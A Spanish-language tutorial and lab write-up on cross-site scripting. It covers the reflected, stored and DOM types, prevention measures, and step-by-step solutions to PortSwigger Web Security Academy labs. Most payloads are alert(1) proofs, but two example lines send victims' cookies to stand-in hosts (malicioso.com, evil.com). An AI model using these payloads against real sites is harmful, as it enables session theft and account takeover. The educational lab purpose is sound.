<details>
  <summary><h2>Índice</h2></summary>
  
 - [Introducción](#introducción)
 - [¿Cuáles son sus principales tipos?](#cuáles-son-sus-principales-tipos)
    - [XSS reflejado](#xss-reflejado)
    - [XSS almacenado](#xss-almacenado)
    - [XSS basado en DOM](#xss-basado-en-dom)
 - [¿Cómo puede explotarse esta vulnerabilidad?](#cómo-puede-explotarse-esta-vulnerabilidad)
    - [XSS reflejado](#xss-reflejado-1)
    - [XSS almacenado](#xss-almacenado-1)
    - [XSS basado en DOM](#xss-basado-en-dom-1)
 - [¿Qué medidas de prevención existen para mitigar el XSS?](#qué-medidas-de-prevención-existen-para-mitigar-el-xss)
    - [Realizar laboratorios](#realizar-laboratorios)
    - [Reflected XSS into HTML context with nothing encoded](#reflected-xss-into-html-context-with-nothing-encoded)
    - [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)
    - [DOM XSS in document.write sink using source location.search](#dom-xss-in-documentwrite-sink-using-source-locationsearch)
    - [DOM XSS in innerHTML sink using source location.search](#dom-xss-in-innerhtml-sink-using-source-locationsearch)
    - [DOM XSS in JQuery anchor href attribute sink using location search.source](#dom-xss-in-jquery-anchor-href-attribute-sink-using-location-searchsource)
    - [DOM XSS in JQuery selector sink using a hashchange event](#dom-xss-in-jquery-selector-sink-using-a-hashchange-event)
    - [Reflected XSS into attribute with angle brackets HTMLencoded](#reflected-xss-into-attribute-with-angle-brackets-htmlencoded)
    - [Stored XSS into anchor href attribute with double quotes HTMLencoded](#stored-xss-into-anchor-href-attribute-with-double-quotes-htmlencoded)
    - [Reflected XSS into a JavaScript string with angle brackets HTML encoded](#reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
</details>

---

## Introducción

El XSS  consiste en manipular un sitio web vulnerable  par que este devuelva código malicioso a los usuarios que usan el sitio web.

Algunos de los lenguajes usados para el XSS son: 

- JavaScript
- HTML
- VBScript

Cuando este código malicioso se ejecuta en le navegador de la víctima, el atacante puede comprometer la interacción de la víctima con el sitio web.

Algunas de las acciones que se pueden realizar son:

- Robar cookies
- Robar tokens de sesión
- Robar información adicional
- Alterar el contenido del sitio web vulnerable
- Hacerse pasar por un usuario
  - Capturar sus credenciales
  - Realizar las accion es quye x usuario pueda realizar
 
En el año 2017, OWASP calificó el XSS como el 7º mayor riesgo de seguridad de un app web y en el año 2021 la integraron con el riesgo INJECTION subiendo hasta la 3º plaza.

---

## ¿Cuáles son sus principales tipos?

### XSS reflejado

El script malicioso viene de la solicitud HTTP actual. 

El payload se inyecta en un parámetro de la solicitud HTTP, para uego ser procesado por la app web y finalmente desplegado en un punto determinado del sitio web, sin que este lo valide. 

Es el más simple de todos los tipos.

### ALmacenado XSS

El script malicioso proviene de la BD del sitio web. La app web guarda el valor de entrada en su BD, haciendo que el script malicioso persista en la misma, hasta que el valor es solicitado por la app web para conformar parte del HTML. 

Esta vulnerabilidad se suele encontrar en:

- Entradas de blog
- Nombres de uusario
- Chats
- Formularios

### XSS basado en DOM

DOM – Document Object Model 

El DOM es la estructura de la página en forma de arbol 
La vulnerabilidad existe en el código del cliente, en vez del código del servidor

Esta vulnerabilidad ocurre cuando una app web contiene algo de JavaScript en el lado del cliente y procesa datos no confiables y de una manera insegura, escribiendo los datos al DOM. 

Un ejemplo de esto es que una página use JavaScript para leer el valor de un campo de entrada y escribirlo en el HTML. Si el atacante controla el valor del campo de entrada, podría poner código malicioso, haciendo que se ejecute.

---

### ¿Cómo puede explotarse esta vulnerabilidad?

#### XSS reflejado 

En el XSS reflejado, el atacante crea un enlace malicioso con un script dentro de alguno de los parámetros de la URL

```bash
https://insecure-website.com/status?message=All+is+well. 
<p>Status: All is well.</p> 
```

↓

```bash
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script> 
<p>Status: <script>/* Bad stuff here... */</script></p> 
```

En este ejemplo, el atacante está poniendo un script malicioso en el parámetro message. 

Si un usuario va a esa URL el script se ejecuta en su navegador. 

En el caso del ejemplo, no es nada peligroso, pero si se ejecuta cualquier script, también se podría realizar cualquier acción.

---

#### XSS almacenado

En este ataque el atacante manda un script / código malicioso a través de un campo de entrada, el servidor guardará el valor de ese campo en su BD.

```bash
<script>fetch('https://malicioso.com/robar?datos='+document.cookie)</script> 
```

En este ejemplo el atacante escribe un comentario en unsitio web con este código malicioso. 

Cada vez que un usuario visitela web, el navegador ejecutara el script, enviando sus cookies al atacante.

#### XSS basado en DOM

Como ya dije, este ataque consiste ne manipular la estructura del HTML para inyectar códigos maliciosos. 

```bash
var search = document.getElementById('search').value; 
var results = document.getElementById('results'); 
results.innerHTML = 'You searched for: ' + search;
```

↓

```bash
You searched for: <img src=1 onerror='/* Bad stuff here... */
```

En este caso el atacante manipula el campo de entrada para poder inyectar el código malicioso. 

Javascript tomará el valor ingresado y lo insertará en el DOM sin sanitizarlo. 

El navegador interpretar el HTML infectado y ejecutará el código malicioso. 

Este es un ejemplo inofensivo, pero se pueden realziar ataques más peligrosos:

```bash
<img src=1 onerror="fetch('https://evil.com/steal?data='+document.cookie)"> 
```

----

## ¿Qué medidas de prevención existen para mitigar el XSS? 

- Codificar la entrada y salida de los datos
  - No permitir el uso de caracteres espaciales
- Evitar la ejecución de scripts insertados en el código HTML
- Evitar el uso de funciones inseguras como
  - Javascript
    - EVAL
    - Domain
    - write()
    - writeIn()
    - innerHTML
    - insertAdjacentHTML
    - onevent
    - Element.outerHTML
  - JQuery
    - add()
    - after()
    - animate()
    - append()
    - before()
    - has()
    - html()
    - index()
   
- Usar librerias para sanitizar los datos
  - HTMLSanitizer
- Establecer el atributo HttpOnly para reducir el impacto de un XSS
- Usar encabezados de respuesta adecuados

---

## Realziar laboratorios

### Reflected XSS into HTML context with nothing encoded 

Este laboratorio es el más sencillo de todos. 

Contiene una vulnerabilidad de XSS en la barra de búsqueda. 

Para poder resolverlo hemos de hacer un ataque XSS que llame a una función alert. 

Accedo al laboratorio y pongo el siguiente código: 

```bash
<script>alert(1)</script>
```

![1 0](https://github.com/user-attachments/assets/c19ccd34-1751-454d-883e-7ec3a9a54fe7)

Al darle al botón **Search** nos saldrá el siguiente mensaje: 

![1 1](https://github.com/user-attachments/assets/21bb710a-f3b5-4b78-bbbc-87ecab273aa4)

Laboratorio resuelto

### Stored XSS into HTML context with nothing encoded 

Este laboratorio contiene una vulnerabilidad XSS en la sección e comentarios. 

Para resolverlo hay que hacer un ataque XSS que llame  auna función alert en la sección de comentarios. 

Podemos el mismo código que anteriormente:

```bash
<script>alert(1)</script> 
```

![2 1](https://github.com/user-attachments/assets/f00b73b2-84b5-4d4e-aab4-f6599f5fe9e2)

Y al publicar el comentario y volver al blog, nos sale el siguiente mensaje:

![2 3](https://github.com/user-attachments/assets/b983575f-0643-438b-aa86-f1921e7402dd)

Laboratorio resuelto. 

### DOM XSS in document.write sink using source location.search 

Este laboratorio contiene una vulnerabilidad XSS basada en DOM. 

La función de “buscar” usa la función Javascript “document.write” la cual escribe datos (en este caso lo que pongamos en la barra de búsqueda) en la página. 

La función “document.write” se llama con datos de “location.search” la cual puede ser controlada con la URL del sitio web. 

El primer paso es buscar algo en la barra de búsqueda: 

![3 1](https://github.com/user-attachments/assets/ba0552e0-844c-44e0-8cc2-cc4ed36382ff)

Sale una página de que no se ha encontrado nada, pero en el código fuente vemos el siguiente script: 

![3 2](https://github.com/user-attachments/assets/79fdf5c6-324b-4c67-812b-94298a7cbb93)

En la etiqueta **<img>** que se encuentra justo debajo del script se puede visualizar que al final de esta se encuentra la información que he buscado:

![image](https://github.com/user-attachments/assets/0b6aaf77-faa7-4445-95c1-4cc09850e522)

Para poder hacer el ataque pongo el siguiente código en la barra de búsqueda: 

```bash
“><svg onload=alert(1)> 
```

![3 4](https://github.com/user-attachments/assets/205ea0b2-f699-4255-ae5e-84db21aa9d3e)

Este código lo que hace es inyectar una etiqueta svg. Esta etiqueta tiene parámetros como onload el cual me permite ejecutar la función alert: 
Al hacer la búsqueda sale lo siguiente:

![3 5](https://github.com/user-attachments/assets/958e2641-1ca8-435d-97d2-2f16247124d5)

En el código aparecerá como se ha inyectado la etiqueta **svg**.

![3 6](https://github.com/user-attachments/assets/142c1a28-ad9e-484f-b619-04dc30384dfc)

Laboratorio resuelto

### DOM XSS in innerHTML sink using source location.search 

Este laboratorio cuenta con otra vulnerabilidad XSS-DOM otra vez en la función de búsqueda. 

Esta vez, se usa inner.HTML para insertar los parámetros que se buscan en una etiqueta <div> sin sanitizarlo. 

Hago de nuevo una búsqueda en el laboratorio y veo su script: 

![image](https://github.com/user-attachments/assets/89e8ded5-3b19-471b-8aa0-b3b755737194)

Esta presente **inner.HTML**. 
Para realizar el ataque pongo el siguiente código en la barra de búsqueda: 

```bash
<img src=1 onerror=alert(1)>
```

Al poner eso, la página devolverá el siguiente mensaje: 

```bash
<div id="output"><img src=1 onerror=alert(1)></div>
```

Y en mi caso: 

![image](https://github.com/user-attachments/assets/a6938218-c2fb-42a8-af72-8bdbcaf058d0)


Laboratorio resuelto


### DOM XSS in JQuery anchor href attribute sink using location search.source

Este laboratorio usa la función $ de la biblioteca JQuery para encontrar un elemento de anclaje, cambiando su atributo **ref** usando los datos de **document.search**

![image](https://github.com/user-attachments/assets/4c4776dc-ecc4-420e-a370-3cd761ef06b1)

En este caso hemos de fijarnos en **Submit feedback.** 
Al poner el ratón encima suyo, se puede ver la url a la que nos lleva:

![5 2](https://github.com/user-attachments/assets/012641ba-aa7c-4058-9677-8783e1bff7eb)

Accedo a la página de feedback y dentro de ella, abro el código y edito la etiqueta **<a>** del botón **Submit Feedback** y pongo lo siguiente: 

```bash
<a href=”/feedback?returnPath=javascript:alert(document.cookie)”>Submit feedback</a> 
```

![5 4](https://github.com/user-attachments/assets/5cf69ad1-7d14-403b-9fa1-3dd80930a748)

Voy a la página de inicio de nuevo y me sale el siguiente mensaje:

![5 5](https://github.com/user-attachments/assets/b3ddc560-bb30-44da-aecc-8631e48ec65a)

En este caso me debería de salir la cookie, pero no me sale, aún asi:
Laboratorio resuelto.

### DOM XSS in JQuery selector sink using a hashchange event

Este laboratorio cuenta con un XSS DOM en la página de inicio. 

Se usa la función $() para poder acceder a una publicación determinada, cuyo nombre se pasa a través de la propiedad location.hash. 

Accedo al laboratorio y en la página de inicio se encuentra el siguiente botón:

![6 2](https://github.com/user-attachments/assets/c4818ee6-c947-47f7-9a21-d4ca3f5a78f4)

Accedo a él y es aquí donde tenemos que realizar el ataque 

Se puede ver una especie de “formulario” donde se puede escribir texto. 

En el campo Body coloco el siguiente código: 

```bash
<iframe  
  src="https://exploit-0a6500b504d1e3bb8130a135019c0016.web-sercurity-academy.net/#"  
  onload="this.src+='<img src=1 onerror=print()>'"  
  hiddenn="hidden"> 
</iframe>
```

![6 3](https://github.com/user-attachments/assets/43a20933-3b63-4489-8693-5ebf0613d4a2)

Este código cargara la página que le estoy pasando a través del valor src dentro del iframe. Esta página tiene una serie de paráemtrosd que me permiten realiza el ataque. 

Mando el exploit a la víctima:

![6 4](https://github.com/user-attachments/assets/92e76cd7-8525-4109-bae5-128f81291d22)

Y me sale la página en el siguiente formato:

![6 5](https://github.com/user-attachments/assets/058ec2f2-9622-4eaf-8690-f664921e4f3d)

Laboratorio resuelto

![image](https://github.com/user-attachments/assets/65706b1e-1d9b-4748-a2ea-5b9c4da2c6ca)

### Reflected XSS into attribute with angle brackets HTMLencoded 

Este laboratorio contiene una vulnerabilidad XSS en la barra de búsqueda de la página de inicio. 

Como en laboratorios anteriores, vuelvo a buscar algo que no esté en la página. 

Al ver el mensaje en el burpsuite se ve el contenido de la búsqueda.

![7 1](https://github.com/user-attachments/assets/d84e3ec3-2aab-4df0-8a6e-08693ec9fe17)

↓

![image](https://github.com/user-attachments/assets/20987324-5e0a-45db-b6bd-d869cadc6ef1)

Para hacer el ataque pongo el siguiente código:

```bash
"onmouseover"=alert(1) 
```

Cuando un usuario pase el ratón por el texto inyectado, el código inyectado que se encuentra en **onmouseover** se ejecuta (en este caso, el **alert(1))**.

Si vemos la petición en burpsuite: 

![image](https://github.com/user-attachments/assets/030ba1ad-3a64-4df8-af23-8517761f97c6)

Se ve como se ha inyectado en **search**. 
Al realizar la búsqueda:

![image](https://github.com/user-attachments/assets/e4a463ea-8f93-4283-850b-48f8cf6809c1)

Laboratorio resuelto. 

### Stored XSS into anchor href attribute with double quotes HTMLencoded 

Este laboratorio contiene la vulnerabilidad XSS en la sección de comentarios, solo que en vez de hacerlo en le comentario como tal, lo haremos en el nombre del usuario (como vimos anteriormente, se podía poner un enlace a una página web en el nombre de usuario). 

Voy a la sección de comentarios y escribo lo siguiente:

![8 5](https://github.com/user-attachments/assets/604aeb63-f61d-4bdb-a3ec-e7cfc8b53a43)

Veo el mensaje de publicar comentario en burpsuite: 

![8 6](https://github.com/user-attachments/assets/1f09bf66-43aa-4979-8b75-e62b652f0532)

Mando le mensaje al **Repeater** y veo los campos de la publicación del comentario: 

![8 7](https://github.com/user-attachments/assets/c2fa66d2-e10e-43b0-a91e-2bdf57e80aa5)

En el parámetro website camboi el contenido original por:

```bash
javascript:alert(1) 
```

![8 8](https://github.com/user-attachments/assets/f76eb803-6736-4c83-974a-11658922e3ae)

Publico el comentario y al darle click al nombre del usuario, sale le siguiente mensaje: 

![8 10](https://github.com/user-attachments/assets/2e9f0caa-7360-4fb6-ba68-3744d969caad)

Laboratorio resuelto. 

### Reflected XSS into a JavaScript string with angle brackets HTML encoded 

Esta laboratorio tiene una vulnerabilidad XSS en la funcionalidad de seguimiento de consultas de búsqueda donde se codifican los corchetes angulares. 

Esto se hace en una cadena Javascript. 

Por decimosexta vez, vuelvo a buscar algo en la barra de búsqueda que no se encuentre en el laboratorio y capturo el paquete en burpsuite junto con su respuesta: 

![image](https://github.com/user-attachments/assets/322f40d1-a5aa-4d8b-901c-7876cba73c43)

En la barra de busqueda pongo el siguiente código: 

Este código se inyectará en el script donde se realiza la búsqueda y se ejecutará al realizar esa búsqueda 

```bash
‘-alert(1)-’
```

![9 6](https://github.com/user-attachments/assets/3484cd2a-91e1-4302-89b2-ba239da57a2c)


Al hacer la búsqueda, sale le siguiente mensaje:

![9 7](https://github.com/user-attachments/assets/87a39c86-85b0-4b3f-85a1-43122826c4cb)

Laboratorio resuelto

















